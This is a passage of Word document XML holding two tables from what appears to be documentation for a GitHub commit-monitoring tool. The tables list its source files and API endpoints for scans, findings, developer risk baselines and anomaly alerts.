        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backend/routers/github_monitor.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~1,471</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All API endpoints, background scan orchestration, AI analysis endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backend/services/github_client.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~150</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Async GitHub REST API client with PAT authentication</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backend/services/commit_analyzer.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>705</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Multi-signal commit analysis engine with 10+ detectors</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backend/services/baseline_engine.py</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>362</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Behavioral baseline computation and anomaly detection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>frontend/src/pages/GitHubMonitorPage.tsx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~2,121</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Multi-tab dashboard UI with interactive visualizations</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>backend/main.py (github tables)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~185</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Database table creation and migration definitions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>API Endpoints Summary</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pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/settings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET/PUT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Get/save GitHub PAT and org</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/settings/test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Test PAT connectivity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/repos</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET/POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>List/add monitored repos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/repos/{id}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DELETE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Remove repo from monitoring</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/scan/{id}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Trigger manual repo scan</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/scan-all</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Scan all active repos</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Paginated commit feed with filters</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/commits/{id}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Full commit details with findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/commits/{id}/ai-analyze</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Trigger AI threat assessment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All findings across commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/findings/export-csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CSV export of findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/developers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All developer risk profiles</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/developers/{email}/baseline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer behavioral baseline</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/developers/{email}/anomalies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer anomalies</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/anomalies</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All anomalies (filterable)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/alerts/sensitive-files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sensitive file alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/summary</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dashboard summary stats</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/github-monitor/timeline</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>14-day risk heatmap data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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